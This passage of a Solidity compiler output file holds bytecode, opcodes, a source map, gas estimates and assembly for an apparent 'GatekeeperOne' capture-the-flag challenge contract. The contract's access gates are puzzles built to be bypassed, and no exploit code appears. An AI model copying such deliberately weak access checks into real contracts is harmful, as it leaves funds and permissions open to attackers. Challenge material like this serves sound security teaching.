6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x411 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3370204E EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9DB31D77 EQ PUSH2 0x9A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x82 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xCE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA2 PUSH2 0x2B1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x109 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x120 PUSH2 0x1FFF GAS PUSH2 0x2D5 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST EQ PUSH2 0x12A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP1 PUSH1 0xC0 SHR PUSH2 0xFFFF AND DUP2 PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ PUSH2 0x193 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x29 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x35F PUSH1 0x29 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO PUSH2 0x202 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x29 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x388 PUSH1 0x29 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ORIGIN PUSH2 0xFFFF AND DUP2 PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ PUSH2 0x267 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x3B1 PUSH1 0x2B SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ORIGIN PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 GT PUSH2 0x34C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x18 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206D6F64756C6F206279207A65726F0000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP4 DUP2 PUSH2 0x355 JUMPI INVALID JUMPDEST MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID SELFBALANCE PUSH2 0x7465 PUSH12 0x65657065724F6E653A20696E PUSH23 0x616C6964206761746554687265652070617274206F6E65 SELFBALANCE PUSH2 0x7465 PUSH12 0x65657065724F6E653A20696E PUSH23 0x616C69642067617465546872656520706172742074776F SELFBALANCE PUSH2 0x7465 PUSH12 0x65657065724F6E653A20696E PUSH23 0x616C696420676174655468726565207061727420746872 PUSH6 0x65A264697066 PUSH20 0x58221220FBDA34E6A2C70EC214AA1FBD5EFF2DA0 0xB7 PUSH21 0x29BBDC770C0CC96B1723A7D69FD264736F6C634300 MOD 0xC STOP CALLER ",
							"sourceMap": "117:1162:1:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80633370204e1461003b5780639db31d771461009a575b600080fd5b6100826004803603602081101561005157600080fd5b81019080803577ffffffffffffffffffffffffffffffffffffffffffffffff191690602001909291905050506100ce565b60405180821515815260200191505060405180910390f35b6100a26102b1565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60003273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561010957600080fd5b6000610120611fff5a6102d590919063ffffffff16565b1461012a57600080fd5b818060c01c61ffff168160c01c63ffffffff1614610193576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602981526020018061035f6029913960400191505060405180910390fd5b8060c01c67ffffffffffffffff168160c01c63ffffffff161415610202576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260298152602001806103886029913960400191505060405180910390fd5b3261ffff168160c01c63ffffffff1614610267576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602b8152602001806103b1602b913960400191505060405180910390fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001915050919050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080821161034c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f536166654d6174683a206d6f64756c6f206279207a65726f000000000000000081525060200191505060405180910390fd5b81838161035557fe5b0690509291505056fe476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274206f6e65476174656b65657065724f6e653a20696e76616c69642067617465546872656520706172742074776f476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274207468726565a2646970667358221220fbda34e6a2c70ec214aa1fbd5eff2da0b77429bbdc770c0cc96b1723a7d69fd264736f6c634300060c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3370204E EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9DB31D77 EQ PUSH2 0x9A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x82 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xCE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA2 PUSH2 0x2B1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x109 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x120 PUSH2 0x1FFF GAS PUSH2 0x2D5 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST EQ PUSH2 0x12A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP1 PUSH1 0xC0 SHR PUSH2 0xFFFF AND DUP2 PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ PUSH2 0x193 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x29 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x35F PUSH1 0x29 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0xC0 SHR PUSH8 0xFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ ISZERO PUSH2 0x202 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x29 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x388 PUSH1 0x29 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ORIGIN PUSH2 0xFFFF AND DUP2 PUSH1 0xC0 SHR PUSH4 0xFFFFFFFF AND EQ PUSH2 0x267 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x3B1 PUSH1 0x2B SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST ORIGIN PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 GT PUSH2 0x34C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x18 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206D6F64756C6F206279207A65726F0000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 DUP4 DUP2 PUSH2 0x355 JUMPI INVALID JUMPDEST MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID SELFBALANCE PUSH2 0x7465 PUSH12 0x65657065724F6E653A20696E PUSH23 0x616C6964206761746554687265652070617274206F6E65 SELFBALANCE PUSH2 0x7465 PUSH12 0x65657065724F6E653A20696E PUSH23 0x616C69642067617465546872656520706172742074776F SELFBALANCE PUSH2 0x7465 PUSH12 0x65657065724F6E653A20696E PUSH23 0x616C696420676174655468726565207061727420746872 PUSH6 0x65A264697066 PUSH20 0x58221220FBDA34E6A2C70EC214AA1FBD5EFF2DA0 0xB7 PUSH21 0x29BBDC770C0CC96B1723A7D69FD264736F6C634300 MOD 0xC STOP CALLER ",
							"sourceMap": "117:1162:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1140:137;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;175:22;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;1140:137;1224:4;283:9;269:23;;:10;:23;;;;261:32;;;;;;483:1:::1;460:19;474:4;460:9;:13;;:19;;;;:::i;:::-;:24;452:33;;;::::0;::::1;;1205:8:::2;681;674:16;;639:52;;653:8;646:16;;639:52;;;631:106;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;882:8;875:16;;847:44;;861:8;854:16;;847:44;;;;839:98;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1066:9;1031:45;;1045:8;1038:16;;1031:45;;;1023:101;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1246:9:::3;1236:7;::::0;:19:::3;;;;;;;;;;;;;;;;;;1268:4;1261:11;;491:1:::2;1140:137:::0;;;:::o;175:22::-;;;;;;;;;;;;:::o;4820:148:0:-;4878:7;4909:1;4905;:5;4897:42;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4960:1;4956;:5;;;;;;4949:12;;4820:148;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "208200",
								"executionCost": "251",
								"totalCost": "208451"
							},
							"external": {
								"enter(bytes8)": "infinite",
								"entrant()": "1044"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 117,
									"end": 1279,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220fbda34e6a2c70ec214aa1fbd5eff2da0b77429bbdc770c0cc96b1723a7d69fd264736f6c634300060c0033",
									".code": [
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "3370204E"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "9DB31D77"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 117,
											"end": 1279,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "tag",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "POP",
											"source": 1
